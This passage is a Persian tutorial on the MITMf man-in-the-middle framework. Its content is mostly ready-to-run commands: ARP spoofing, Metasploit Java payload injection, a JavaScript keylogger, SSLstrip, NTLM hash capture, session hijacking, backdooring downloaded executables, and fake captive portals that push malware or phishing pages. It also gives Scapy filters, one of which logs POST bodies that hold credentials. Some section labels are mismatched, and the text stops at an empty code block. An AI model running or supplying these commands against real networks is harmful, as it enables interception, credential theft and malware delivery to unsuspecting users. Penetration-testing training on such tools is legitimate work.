	- مشکل اصلی اینجاست که مرورگر فایل manifest را تا زمان تغییر محتوایش دوباره دانلود نمی‌کند. اگر مهاجم یک بار بتواند این فایل را مسموم کند، محتوای مخرب برای مدت طولانی در مرورگر هدف باقی می‌ماند. امروزه این قابلیت منسوخ شده و با Service Workers جایگزین شده است.
###### Cheat Sheet
```sh
#1: --java-payload => Java Applet Injection
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --java-payload /root/metasploit_payload.jar -i eth0
    
#2: --jskeylogger => JavaScript Keylogger
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 --jskeylogger -i eth0

tail -f /var/log/mitmf/jskeylogger.log    #Read & Follow Logged Keys
cat /var/log/mitmf/jskeylogger.log        #Simple Read Logged Keys

#3: --appoison => App Cache Poisoning
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 --appoison -i eth0
```
##### MITMf Plugins
###### All Plugins Table
همانطور که گفتیم MITMf به صورت ماژولار طراحی شده و هر یک از قابلیت‌های اصلی آن در قالب یک پلاگین ارائه می‌شود. طبق مستندات رسمی، لیست کاملی از پلاگین‌های موجود به شرح زیر است:

| پلاگین               | کارکرد و سناریوی استفاده                                                                                                     | روش پیاده‌سازی                        |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------- | ------------------------------------- |
| **HTA Drive-By**     | یک اعلان به‌روزرسانی جعلی به کاربر نشان می‌دهد و او را به دانلود یک برنامه HTA (HTML Application) ترغیب می‌کند.              | `--hta`                               |
| **SMBTrap**          | از آسیب‌پذیری 'SMB Trap' در کلاینت‌های متصل برای اجرای کد یا دریافت اطلاعات کاربری بهره می‌برد.                              | `--smbtrap`                           |
| **ScreenShotter**    | با استفاده از Canvas در HTML5، یک اسکرین‌شات دقیق از صفحه مرورگر سمت کلاینت تهیه می‌کند.                                     | `--screen`                            |
| **Responder**        | با مسموم‌سازی پروتکل‌های LLMNR, NBT-NS و MDNS، اطلاعات احراز هویت ویندوز را دریافت می‌کند و یک سرور جعلی WPAD راه می‌اندازد. | `--responder --wredir --nbtns`        |
| **SSLstrip+**        | ترافیک HTTPS را به HTTP تنزل می‌دهد و می‌تواند به‌طور نسبی از HSTS عبور کند.                                                 | `--sslstrip`                          |
| **Spoof**            | ترافیک شبکه را با روش‌های ARP, ICMP, DHCP یا DNS Spoofing تغییر مسیر می‌دهد (حمله MITM اصلی).                                | `--spoof --arp --gateway IP`          |
| **BeEFAutorun**      | ماژول‌های BeEF را بر اساس نوع سیستم‌عامل یا مرورگر کلاینت، به‌طور خودکار اجرا می‌کند.                                        | `--beef-auto`                         |
| **AppCachePoison**   | با مسموم‌سازی حافظه کش HTML5 مرورگر، کد مخرب را به‌طور دائمی روی مرورگر هدف ذخیره می‌کند.                                    | `--appoison`                          |
| **Ferret-NG**        | به‌طور شفاف نشست‌های کاربران (Session Hijacking) را برداشت میکند.                                                            | `--feretng`                           |
| **BrowserProfiler**  | تلاش می‌کند تمامی پلاگین‌های نصب‌شده در مرورگر کلاینت را شناسایی و گزارش کند.                                                | `--browser-profiler`                  |
| **FilePwn**          | فایل‌های اجرایی (exe.) که از طریق HTTP دانلود می‌شوند را با استفاده از Backdoor Factory آلوده می‌کند.                        | `--filepwn`                           |
| **Inject**           | محتوای دلخواه (HTML, JS, URL) را به صفحات وب در حال عبور تزریق می‌کند.                                                       | `--inject --js-file /path/`           |
| **BrowserSniper**    | روی کلاینت‌هایی که پلاگین‌های مرورگر قدیمی دارند، حملات Drive-by دانلود اجرا می‌کند.                                         | `--browser-sniper`                    |
| **JSkeylogger**      | یک کی‌لاگر مبتنی بر جاوااسکریپت را به صفحات وبی که کاربر باز می‌کند تزریق می‌نماید.                                          | `--jskeylogger`                       |
| **Replace**          | محتوای دلخواه در صفحات HTML را با محتوای دیگری جایگزین می‌کند.                                                               | `--replace`                           |
| **SMBAuth**          | با جعل پاسخ‌های SMB، تلاش می‌کند تا فرآیند احراز هویت SMB را از سوی کلاینت‌ها برانگیزد.                                      | `--smbauth`                           |
| **Upsidedownternet** | تمامی تصاویر در صفحات وب را 180 درجه می‌چرخاند (بیشتر جنبه نمایشی و اثبات نفوذ دارد).                                        | `--upsidedownternet`                  |
| **Captive**          | یک Captive Portal (پورتال اسیر) ایجاد کرده و تمام درخواست‌های HTTP را به یک صفحه مشخص هدایت می‌کند.                          | `--captive --portalurl http://SERVER` |

###### Plugins Usage Guide
اکنون روش استفاده از این پلاگین ها را با یکدیگر بررسی میکنیم:

1. **پلاگین HTA Drive-By:**
	- کاربرد و سناریو استفاده:  این پلاگین برای اجرای حملات مهندسی اجتماعی (Social Engineering) پیشرفته با هدف ترغیب کاربر به دانلود و اجرای یک فایل مخرب HTA (HTML Application) طراحی شده است. سناریوی اصلی آن، نمایش یک اعلان به‌روزرسانی جعلی (مانند به‌روزرسانی مرورگر یا Flash Player) در مرورگر هدف است.
	- مکانیزم عملکرد: هنگامی که کاربر یک وب‌سایت را باز می‌کند، پلاگین به‌طور خودکار ترافیک HTTP را رهگیری کرده و پاسخ اصلی را با یک صفحه HTML جعلی که در پوشه `config/hta_driveby/ `قرار دارد جایگزین می‌کند. این صفحه حاوی کدی است که دانلود یک فایل با پسوند `hta. `را آغاز می‌کند.
	- فایل ها و روش کانفیگ این پلاگین را در فصل MITMf Configuration توضیح خواهیم داد.
	- روش استفاده:
```sh
sudo python2 mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --hta
```

2. **پلاگین SMBTrap:**
	- کاربرد و سناریو استفاده: این پلاگین از یک آسیب‌پذیری قدیمی در سرویس گیرنده SMB ویندوز سوءاستفاده می‌کند. زمانی که یک کلاینت ویندوزی سعی در اتصال به یک آدرس SMB (مثلاً `\\server\share`) دارد، این پلاگین پاسخ جعلی ارسال کرده و می‌تواند اعتبارنامه‌های کاربر را دریافت کند. سناریوی ایده‌آل آن، شبکه‌های داخلی با کلاینت‌های ویندوزی قدیمی یا پیکربندی‌ نشده است.
	- مکانیزم عملکرد: این پلاگین یک سرور SMB جعلی راه‌اندازی کرده و به درخواست‌های SMB گوش می‌دهد و به‌جای پاسخ واقعی، یک چالش احراز هویت (Authentication Challenge) برای کلاینت ارسال می‌کند تا هش NTLM آن‌ها را دریافت کند.
	- روش استفاده:
```sh
sudo python2 mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --smbtrap
```

3. **پلاگین ScreenShotter:**
	- کاربرد و سناریو استفاده: گرفتن یک اسکرین‌شات از صفحه مرورگر هدف. برای اثبات نفوذ و جمع‌آوری اطلاعات بصری از فعالیت کاربر بسیار مناسب است.
	- مکانیزم عملکرد: از قابلیت HTML5 Canvas مرورگر برای رندر و ارسال تصویر صفحه به سمت مهاجم استفاده می‌کند.
	- روش استفاده:
```sh
sudo python2 mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --screen
```

4. **پلاگین Responder:**
	- کاربرد و سناریو استفاده: این پلاگین برای جمع‌آوری اطلاعات احراز هویت در شبکه‌های ویندوزی با مسموم‌سازی پروتکل‌های NetBIOS، LLMNR و MDNS استفاده می‌شود. سناریوی اصلی آن، شبکه‌هایی است که در آن‌ها دستگاه‌ها برای پیدا کردن یکدیگر از این پروتکل‌ها استفاده می‌کنند.
	- مکانیزم عملکرد: هنگامی که یک کلاینت ویندوزی نمی‌تواند نام میزبانی را از طریق DNS پیدا کند، از درخواست‌های broadcast LLMNR و NetBIOS استفاده می‌کند. پلاگین Responder به این درخواست‌ها گوش داده و با جعل هویت، کلاینت را فریب می‌دهد تا اعتبارنامه NTLM خود را برای مهاجم ارسال کند. همچنین یک سرور WPAD جعلی برای حملات پراکسی خودکار راه‌اندازی می‌کند.
	- روش استفاده:
```sh
sudo python2 mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --responder --wredir --nbtns
```

5. **پلاگین SSLstrip+:**
	- کاربرد و سناریو استفاده: این پلاگین برای تحلیل محتوای ترافیک رمزنگاری‌شده HTTPS با تنزل اجباری آن به HTTP استفاده می‌شود. این قابلیت به مهاجم اجازه می‌دهد تا اطلاعات حساس مانند کوکی‌های سشن و اطلاعات ورود را که در وب‌سایت‌های فاقد HSTS منتقل می‌شود، مشاهده کند.
	- مکانیزم عملکرد: پلاگین به عنوان یک پراکسی شفاف (Transparent Proxy) عمل کرده و ارتباط امن بین مرورگر و سرور را قطع می‌کند. تمام درخواست‌های HTTPS را به HTTP تبدیل کرده و با سرور مقصد ارتباط برقرار می‌کند. نسخه "Plus" این قابلیت را دارد که برخی از مکانیزم‌های HSTS را نیز دور بزند.
	- روش استفاده:
```sh
sudo python2 mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --sslstrip
```

6. **پلاگین Spoof:**
	- کاربرد و سناریو استفاده: این پلاگین، هسته اصلی تمام حملات MITM در MITMf است و برای قرار دادن مهاجم در مسیر ترافیک هدف استفاده می‌شود. سناریوی آن هرگونه تست نفوذ شبکه داخلی است.
	- مکانیزم عملکرد: پلاگین از روش‌های مختلفی برای تغییر مسیر ترافیک پشتیبانی می‌کند. رایج‌ترین روش، ARP Spoofing است که با ارسال بسته‌های ARP جعلی، جداول ARP قربانی و گیت‌وی را مسموم می‌کند. روش‌های دیگر شامل ICMP Redirect و DHCP Spoofing است.
	- روش استفاده:
```sh
sudo python2 mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --targets 192.168.1.10
```

7. **پلاگین BeEFAutorun:**
	- کاربرد و سناریو استفاده: این پلاگین برای یکپارچگی با چارچوب BeEF طراحی شده و به‌طور خودکار ماژول‌های BeEF را بر اساس مشخصات سیستم‌عامل و مرورگر قربانی اجرا می‌کند.
	- مکانیزم عملکرد: پس از تزریق هوک BeEF، مرورگر قربانی در پنل BeEF ظاهر می‌شود. پلاگین BeEFAutorun با شناسایی اثر انگشت (Fingerprint) مرورگر، بهترین و مؤثرترین ماژول‌های BeEF را برای آن هدف خاص به صورت خودکار اجرا می‌کند.
	- روش استفاده:
```sh
sudo python2 mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --inject --beef-hook --beef-auto
```

8. **پلاگین Ferret-NG:**
	- کاربرد و سناریو استفاده: این پلاگین برای برداشت نشست‌های HTTP کاربران (Session Hijacking) به کار می‌رود. سناریوی آن زمانی است که بخواهیم بدون نیاز به رمز عبور، به حساب کاربری قربانی در یک وب‌سایت دسترسی پیدا کنیم.
	- مکانیزم عملکرد: ترافیک HTTP را برای کوکی‌های نشست (Session Cookies) تحلیل می‌کند. کوکی‌های معتبر را می‌تواند برای جعل هویت کاربر و ورود به حساب وی در مرورگر مهاجم استفاده کند.
	- روش استفاده:
```sh
sudo python2 mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --ferretng
```

9. **پلاگین FilePwn:**
	- کاربرد و سناریو استفاده: این پلاگین برای آلوده‌سازی فایل‌های اجرایی (exe.) که کاربر از اینترنت دانلود می‌کند به کار می‌رود. سناریوی بسیار پیشرفته آن، نفوذ به شبکه‌های ایزوله از طریق آلوده‌سازی نرم‌افزارهای به‌روزرسانی است.
	- مکانیزم عملکرد: با ابزارهای Backdoor Factory و BDFProxy یکپارچه شده است. زمانی که کاربر یک فایل اجرایی را از طریق HTTP دانلود می‌کند، پلاگین دانلود را رهگیری، فایل اصلی را با یک درپشتی (Backdoor) ترکیب کرده و فایل آلوده را به سمت کاربر ارسال می‌کند، بدون آنکه کاربر متوجه شود.
	- روش استفاده:
```sh
sudo python2 mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --filepwn
```

10. **پلاگین BrowserSniper:**
	- کاربرد و سناریو استفاده: هدف این پلاگین، اجرای حملات Drive-by Download بر روی مرورگرهایی است که افزونه‌های قدیمی و آسیب‌پذیر دارند. سناریوی آن، آلوده‌سازی خاموش یک سیستم تنها با بازدید از یک وب‌سایت است.
	- مکانیزم عملکرد: با پلاگین BrowserProfiler یکپارچه شده و پس از شناسایی افزونه‌های آسیب‌پذیر مرورگر، payload های exploit مناسب را از طریق صفحات وب تزریق می‌کند.
	- روش استفاده:
```sh
sudo python2 mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --browser-sniper
```

11. **پلاگین Replace:**
	- کاربرد و سناریو استفاده: برای جایگزینی محتوای دلخواه مهاجم با محتوای اصلی صفحات وب به کار می‌رود. سناریوهای آن می‌تواند از نمایش یک پیام Deface تا جایگزینی فایل‌های دانلودی با نسخه‌های مخرب باشد.
	- مکانیزم عملکرد: ترافیک HTTP را بررسی کرده و بر اساس قوانین تعریف‌شده (کلمات کلیدی یا regex)، بخشی از محتوای صفحه (مثلاً یک کلمه خاص یا یک لینک) را با محتوای جدید جایگزین می‌کند.
	- روش استفاده:
```sh
sudo python2 mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --replace
```

12. **پلاگین SMBAuth:**
	- کاربرد و سناریو استفاده: هدف این پلاگین، وادار کردن کلاینت‌های شبکه به آغاز فرآیند احراز هویت SMB است. حتی اگر کاربر قصد دسترسی به یک Share را نداشته باشد، با جعل پاسخ‌های SMB، اعتبارنامه وی دریافت می‌شود.
	- مکانیزم عملکرد: با ارسال بسته‌های SMB جعلی به کلاینت‌ها، وانمود می‌کند که یک سرور فایل معتبر در شبکه وجود دارد. کلاینت ویندوزی به طور خودکار سعی در احراز هویت با این سرور جعلی می‌کند و هش NTLM خود را ارسال می‌دارد.
	- روش استفاده:
```sh
sudo python2 mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --smbauth
```

13. **پلاگین Upsidedownternet:**
	- کاربرد و سناریو استفاده: این پلاگین بیشتر جنبه نمایشی و برای اثبات نفوذ (Proof of Concept) دارد. تمام تصاویر مرورگر قربانی را 180 درجه می‌چرخاند.
	- مکانیزم عملکرد: با تزریق CSS یا جاوااسکریپت به صفحات وب، ویژگی `transform: rotate` به عناصر <img> اضافه می‌شود.
	- روش استفاده:
```sh
sudo python2 mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --upsidedownternet
```

14. **پلاگین BrowserProfiler:**
	- کاربرد و سناریو استفاده: شناسایی و ثبت تمامی پلاگین‌های نصب‌شده روی مرورگر هدف. این اطلاعات برای یافتن آسیب‌پذیری‌های خاص مرورگر (Browser Fingerprinting) بسیار ارزشمند است.
	- مکانیزم عملکرد: با تزریق کد جاوااسکریپت، لیست پلاگین‌های مرورگر را استخراج می‌کند.
	- روش استفاده:
```sh
sudo python2 mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --browser-profiler
```

- سایر پلاگین ها مانند `JSkeylogger, AppCachePoison, inject, ...` را درفصل های قبل توضیح دادیم. همچنین پلاگین دیگری `Captive` را نیز در فصل بعدی توضیح خواهیم داد.
##### MITMf Features
###### MITMf-API
ابزار MITMf دارای قابلیتی بنام MITMf-API است که درواقع یک API داخلی است و می‌تواند برای کنترل چهارچوب از راه دور و یکپارچگی با سایر ابزارها استفاده شود. این قابلیت بصورت خودکار در هنگام شروع کار MITMf اجرا میشود.

**کاربرد و عملکرد:** MITMf-API یک سرویس REST است که به طور پیش‌فرض روی `127.0.0.1:9999` اجرا می‌شود. این API به ما امکان میدهد تا دستورات را از طریق HTTP به MITMf ارسال کرده و وضعیت آن را دریافت کنیم. این قابلیت برای اتوماسیون و مدیریت از راه دور بسیار مفید است.

**روش استفاده و پیاده‌سازی:**
1. **فعال‌سازی API:** مطمئن شوید که بخش `[[MITMf-API]]` در فایل `config/mitmf.conf` تنظیمات صحیحی داشته باشد.
2. **اجرای MITMf:** ابزار را طبق معمول اجرا کنید. پیام `|_ MITMf-API online` باید در کنسول ظاهر شود.
```sh
sudo python2 mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1
```
3. **ارسال درخواست به API:** اکنون می‌توانیم با استفاده از ابزاری مانند `curl` برای تعامل با API استفاده کنیم:
```sh
curl http://127.0.0.1:9999/api/some-method
```

###### Captive Portal - Scenario 1: Use Default Page
- **تعریف دقیق:** Captive Portal یک صفحه وب است که دسترسی کاربر به اینترنت را تا زمانی که عملی خاص (مانند قبول شرایط استفاده، تماشای تبلیغات یا وارد کردن اطلاعات) انجام نداده، محدود می‌کند. این همان سیستمی است که معمولاً در هتل‌ها، فرودگاه‌ها و کافی‌شاپ‌ها دیده می‌شود.

- **کاربرد و مکانیزم در MITMf:** پلاگین Captive در MITMf، یک Captive Portal (پورتال اسیر)  جعلی ایجاد می‌کند. این پلاگین تمام درخواست‌های HTTP کاربران قربانی را رهگیری کرده و با یک پاسخ "302 Redirect" آن‌ها را به صفحه پورتال تحت کنترل مهاجم هدایت می‌کند.
    
- **سناریو استفاده:**
    1. **توزیع بدافزار:** نمایش یک صفحه جعلی که کاربر را مجبور می‌کند برای دسترسی به اینترنت، یک "برنامه امنیتی" (که در واقع بدافزار است) را دانلود و اجرا کند.
    2. **صفحات فیشینگ:** نمایش یک صفحه ورود جعلی شبیه به فیسبوک یا گوگل و درخواست از کاربر برای ورود مجدد.

- **مثال:** برای اجرای یک پورتال با صفحه پیش‌فرض خود MITMf (که دانلود یک فایل اجرایی مثلا CaptiveClient.exe را پیشنهاد می‌دهد) از دستور زیر استفاده می‌کنیم.
```sh
sudo python2 mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --captive
```

- دستور `python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive` چه می‌کند؟
	1. **فعال‌سازی پلاگین:** فلگ `--captive` پلاگین Captive Portal را فعال می‌کند.

	2. **رهگیری ترافیک:** ماژول ARP Spoofing خود را بین هدف و گیت‌وی قرار می‌دهد.

	3. **نمایش صفحه:** هر زمان که کاربر هدف سعی کند وب‌سایتی (مثلاً `google.com`) را باز کند، MITMf درخواست HTTP او را رهگیری کرده و با یک پاسخ "302 Redirect" به آدرس `http://your-ip/portal.html` هدایت می‌کند.
    
	4. **میزبانی محتوا:** MITMf فایل `portal.html` را از پوشه `config/captive/` خوانده و به کاربر نمایش می‌دهد. این صفحه از کاربر می‌خواهد تا با دانلود و اجرای `CaptiveClient.exe` به اینترنت دسترسی پیدا کند.

**کانفیگ Captive Portal با `config/captive`**
- پوشه `config/captive` مغز متفکر پلاگین Captive است و همه چیز برای راه‌اندازی یک Captive Portal در آن قرار دارد. 
- وقتی دستوری Captive Portal را اجرا می‌کنیم، دقیقاً از فایل‌های درون این پوشه برای نمایش به کاربر استفاده می‌شود.
- برای شخصی‌سازی، کافی است فایل `portal.html` درون این دایرکتوری را با فایل HTML دلخواه خود جایگزین کنیم.

- **محتویات و تنظیمات پوشه `config/captive`**

| فایل                | کاربرد                                                                                                                                    |
| ------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `portal.html`       | این فایل، صفحه اصلی Captive Portal است که کاربر در مرورگر خود می‌بیند. این یک قالب آماده است که می‌توانیم آن را به‌دلخواه خود تغییر دهیم. |
| `CaptiveClient.exe` | یک فایل اجرایی نمونه (که عمداً در مخزن گنجانده نشده) برای شبیه‌سازی دانلود یک "نرم‌افزار امنیتی" جعلی توسط کاربر.                         |

###### Captive Portal - Scenario 2: Use Domain instead of IP
دستور زیر تمامی ترافیک کاربران را به `http://captive.portal/portal.html` هدایت میکند.
```sh
python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --dns --captive --use-dns
```

- **توضیح کامند:**
	- **مفهوم `captive.portal`:** در اینجا `captive.portal` یک نام دامنه (Hostname) است، نه یک فایل. این نام باید به IP مهاجم اشاره کند.

	- **نقش `dns--`:** با فعال‌سازی ماژول DNS Spoofing (`--dns`)، MITMf به‌طور خودکار هر درخواست DNS برای `captive.portal` را به IP مهاجم ترجمه می‌کند.

	- **نقش `use-dns--`:** این فلگ به پلاگین Captive می‌گوید که کاربران را به جای `http://192.168.1.99/portal.html` به `http://captive.portal/portal.html` هدایت کند. این کار باعث می‌شود URL در مرورگر قربانی طبیعی‌تر به نظر برسد و شک کمتری برانگیزد .

###### Captive Portal - Scenario 3: Use Python SimpleHTTPServer
برای استفاده از یک وب‌سرور اختصاصی (SimpleHTTPServer) به همراه قابلیت `portaldir--`، مراحل زیر را دنبال می‌کنیم.
- **پیش نیاز: تنظیم پورت HTTP Server در `mitmf.conf`**
	- پورت پیش‌فرضی که MITMf برای وب‌سرور `SimpleHTTPServer` استفاده می‌کند در فایل `config/mitmf.conf` تنظیم می‌شود. برای تغییر آن:
		1. فایل `mitmf.conf` را برای ویرایش باز می‌کنیم.
		2. به دنبال بخش `[[Captive]]` می‌گردیم.
		3. پارامتر `port` را به مقدار دلخواه خود تغییر می‌دهیم.
```sh
#File: mitmf.conf
    [[Captive]]
        #SimpleHTTPServer Port
        port = 8080
```

1. **روش اول: اجرا با Local Directory و IP**
	- با این دستور، MITMf یک SimpleHTTPServer را روی پورت تنظیم‌شده (مثلاً 8080) راه‌اندازی کرده و فایل‌های موجود در مسیر LOCALDIR را از طریق آن به اشتراک می‌گذارد. سپس کاربران به http://IP:8080 هدایت می‌شوند.
	- ویژگی این روش این است که میتوانیم یک `index.html` شخصی سازی شده را در دایرکتوری `LOCALDIR` قرار دهیم تا فایل شخصی سازی شده به کاربر نمایش داده شود.
```sh
python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive --portaldir /path/to/LOCALDIR
```

2. **روش دوم: اجرا با Local Directory و Hostname**
	- در این سناریو، مانند قبل از SimpleHTTPServer استفاده می‌شود، اما این بار با ترکیب `use-dns--`، کاربران به جای IP، با نام دامنه به پورتال هدایت می‌شوند.
	- در اینجا نیز نیازی به تنظیم دستی دامنه در فایل جداگانه نیست. این فرآیند کاملاً خودکار است:
	- فلگ `use-dns--` به پلاگین Captive می‌گوید که از http://captive.portal به جای http://IP برای هدایت کاربران استفاده کند.
	- ماژول `dns--` همزمان در حال اجرا است و درخواست‌های DNS برای `captive.portal` را به IP مهاجم برمی‌گرداند.

```sh
python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --dns --captive --portaldir /path/to/LOCALDIR --use-dns
```
در این دستور، `captive.portal` یک نام دامنه(هاست) ثابت در کد MITMf است و مسئولیت ترجمه آن به IP مهاجم کاملاً بر عهده ماژول `dns--` می‌باشد.
##### MITMf Filtering
###### Description & Syntax
یکی از قدرتمندترین ویژگی‌های MITMf، قابلیت استفاده از فیلترهای پایتون با الهام از Scapy است. این ویژگی به ما اجازه می‌دهد تا با استفاده از کتابخانه قدرتمند Scapy در پایتون، فیلترهای سفارشی برای دستکاری بسته‌های شبکه بنویسیم. این قابلیت بسیار قدرتمندتر از فیلترهای سنتی Ettercap است. برای استفاده از یک فیلتر، آن را در یک فایل `py.` ذخیره میکنیم و سپس آنرا با فلگ `F-` صدا می‌زنیم.

- **متغیرهای اصلی:**
	- از `packet` برای دسترسی به بسته در قالبی سازگار با Scapy استفاده می‌شود.
	- از `data` برای دسترسی به داده خام بسته استفاده می‌شود.

- **قواعد کلی نوشتن فیلتر MITMf**
	1. `if packet.haslayer(PROTOCOL)` بررسی پروتکل بسته و انتخاب بسته ای که میخواهیم
	2. `log.info("LOG MESSAGE")` ثبت لاگ از عملیات انجام شده
	3. `packet.PARAMETER = VALUE` تغییر مقادیر و فیلدهای پکت مورد نظر با داده های دلخواه

- **مثال ساده:** ضبط بسته های ICMP و تغییر آیپی مبدا بسته
```python
if packet.haslayer(ICMP):
	log.info('Got an ICMP packet!')
	packet.src = '192.168.1.0'
```

در ادامه نمونه از فیلترهای پراستفاده را باهم بررسی میکنیم.

###### Filter 1: ICMP Redirection 
- فیلتر تغییر مسیر تمام بسته‌های ICMP:
	1. فیلتر زیر تمام بسته های عبوری در شبکه را در یک `if` بررسی میکند.
	2. اگر در بسته لایه ای بنام `ICMP` وجود داشت، ابتدا یک لاگ مبنی بر اینکه بسته ICMP دریافت شد ثبت میکند.
	3. سپس فیلد `dst` در IP را به IP جدیدی که باید بسته به آن Redirect شود تغییر میدهد.

1. **مرحله اول:** ساخت فیلتر `redirect_icmp.py`
```python
import logging
logging.getLogger("scapy").setLevel(logging.ERROR)

if packet.haslayer('ICMP'):
    log.info('ICMP Packet Received from %s !' % packet['IP'].src)  
    #(آیپی تست نفوذگر)هدایت تمامی بسته ها به آیپی مشخص
    packet.dst = '192.168.1.0'
    #از خط زیر هم برای تغییر آیپی مقصد میتوان استفاده کرد
    #packet['IP'].dst = '192.168.1.50'
```

2. **مرحله دوم:** استفاده از فیلتر
```sh
sudo python mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 -F redirect_icmp.py
```

###### Filter 2: Remove Tracking Cookies(Privacy Filter)
- فیلتر حذف کوکی‌های ردیابی (Privacy Filter):
	1. فیلتر زیر تمام بسته های عبوری در شبکه را در یک `if` بررسی میکند.
	2. اگر در بسته لایه ای بنام `HTTPRequest` وجود داشت که یعنی بسته HTTP است آن بسته را به `if` بعدی میفرستد.
	3. در `if` بررسی میکند که اگر `Cookie` درون فیلدهای بسته مورد نظر هست، ابتدا بسته مورد نظر را حذف میکند و سپس یک لاگ مبنی بر اینکه کوکی‌های ردیابی از درخواست HTTP حذف شد را ثبت میکند.

1. **مرحله اول:** ساخت فیلتر `tracking_cookies_remover.py`
```python
if packet.haslayer('HTTPRequest'):
    if 'Cookie' in packet['HTTPRequest'].fields:
        del packet['HTTPRequest'].Cookie
        log.info('Tracking Cookies Removed. %s.' % packet['IP'].src)
```

2. **مرحله دوم:** استفاده از فیلتر
```sh
sudo python mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 -F tracking_cookies_remover.py
```

###### Filter 3: Logged All HTTP POST Requests
- فیلتر ثبت تمام درخواست‌های POST:
	1. فیلتر زیر تمام بسته های عبوری در شبکه را در یک `if` بررسی میکند.
	2. اگر در بسته لایه ای بنام `Raw` وجود داشت بسته را برای Decoding به خط بعدی میفرستد.
	3. سپس در `if` دیگری بررسی میکند که اگر `POST` درون داده Decode شده وجود دارد، آن بسته را به همراه IP که آنرا ارسال کرده و متن درخواست لاگ میزند. 

1. **مرحله اول:** ساخت فیلتر `post_logger.py`
```python
import re
if packet.haslayer('Raw'):
    raw_data = packet['Raw'].load.decode('utf-8', errors='ignore')
    if 'POST' in raw_data:
        log.info('POST Request from %s Logged.:' % packet['IP'].src)
        log.info(raw_data.split('\r\n')[-1]) #Show request body
```

2. **مرحله دوم:** استفاده از فیلتر
```sh
sudo python mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 -F post_logger.py
```
###### Filter 4: Capture DNS Traffic
- ثبت و تحلیل ترافیک DNS:
	1. فیلتر زیر تمام بسته های عبوری در شبکه را در یک `if` بررسی میکند.
	2. اگر در بسته لایه ای بنام `DNS` وجود داشت که یعنی بسته DNS است، اطلاعات مربوط به آن را از لایه IP استخراج و ثبت می‌کند و در یک لاگ شامل اطلاعات کوئری DNS ثبت میکند.

- سناریو استفاده: 
	1. مانیتورینگ و ثبت تمام درخواست‌های DNS عبوری از شبکه
	2. تحلیل رفتار کاربران
	3. شناسایی بدافزارها از طریق دامنه‌های درخواستی (C&C)
	4. عیب‌یابی شبکه

2. **مرحله اول:** ساخت فیلتر `dns_logger.py`
```python
if packet.haslayer('DNS'):
    log.info('DNS Query: %s from %s' % (packet['DNS'].qd.qname, packet['IP'].src))
```

2. **مرحله دوم:** استفاده از فیلتر
```sh
sudo python mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 -F dns_logger.py
```

###### Filter 5: Telnet Login Alert
- فیلتر حذف کوکی‌های ردیابی (Privacy Filter):
	1. فیلتر به دنبال بسته‌های TCP روی پورت 23 (Telnet) می‌گردد. 
	2. اگر حاوی کلمه "Login" بودند، آن را به عنوان تلاش برای ورود ثبت می‌کند.

- سناریو استفاده: 
	1. شناسایی و ثبت تلاش‌های ورود از طریق پروتکل ناامن Telnet.
	2. تشخیص انتقال متن‌شفاف (Plain Text) اطلاعات حساس در شبکه‌های قدیمی

2. **مرحله اول:** ساخت فیلتر `telnet_monitor.py`
```python
if packet.haslayer('TCP') and packet['TCP'].dport == 23:
    if 'Login' in str(packet['Raw'].load):
        log.info('Telnet Login Attempt from %s' % packet['IP'].src)
```

2. **مرحله دوم:** استفاده از فیلتر
```sh
sudo python mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 -F telnet_monitor.py
```

###### Filter 6: Block Specific User-Agent
- فیلتر حذف کوکی‌های ردیابی (Privacy Filter):
	1. فیلتر درخواست‌های HTTP را برای یک رشته User-Agent خاص جستجو می‌کند.
	2. در صورت تطابق، بسته Drop می‌شود.
	3. در صورتی که میخواهید User-Agent دیگری را شناسایی و مسدود کنید، نام آنرا بجای `Wget` وارد کنید.

- سناریو استفاده: 
	1. فیلتر کردن و مسدود کردن ترافیک HTTP از یک مرورگر یا ابزار خاص
	2. جلوگیری از دسترسی ربات‌ها یا ابزارهای خاص به شبکه.

2. **مرحله اول:** ساخت فیلتر `block_user_agent.py`
```python
if packet.haslayer('HTTPRequest'):
    if 'Wget' in packet['HTTPRequest'].User_Agent:
        log.info('Blocked request from Wget')
        packet.drop()
```

2. **مرحله دوم:** استفاده از فیلتر
```sh
sudo python mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 -F block_user_agent.py
```
##### MITMf Configuration 
###### Path of MITMf Configuration Files 
فایل پیکربندی اصلی `mitmf.conf` در مسیر **`config/mitmf.conf`** نسبت به پوشه اصلی MITMf قرار دارد. یعنی پس از نصب، این پوشه `config` به مسیر نصب منتقل می‌شود. در کالی لینوکس و بسیاری از توزیع‌ها، مسیر استاندارد آن بصورت زیر است:
	`/usr/share/mitmf/config/mitmf.conf`

برای کانفیگ این فایل پیشنهاد میشود که ابتدا آنرا به دایرکتوری `/etc/mitmf/` کپی کنیم و سپس به ویرایش فایل کانفیگ بپردازیم:
```sh
